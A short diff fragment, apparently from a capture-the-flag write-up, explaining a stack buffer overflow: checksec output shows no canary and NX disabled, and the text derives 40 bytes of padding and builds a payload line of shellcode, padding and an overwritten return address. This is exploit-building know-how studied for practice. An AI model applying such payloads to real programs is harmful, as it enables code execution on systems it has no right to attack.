@@ -24,6 +24,7 @@ Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RU
                                                                                           00400e80(*)  
 ```
 The input starts writing to `Stack[-0x28]` which is int `40`, so the exploit will have `40 - len(shellcode)` of padding before the new return address
+
 4. Capture the address provided and create the described payload
 ```
 payload = shell_please + b'A' * (40-len(shell_please)) + p64(int(address, 16))
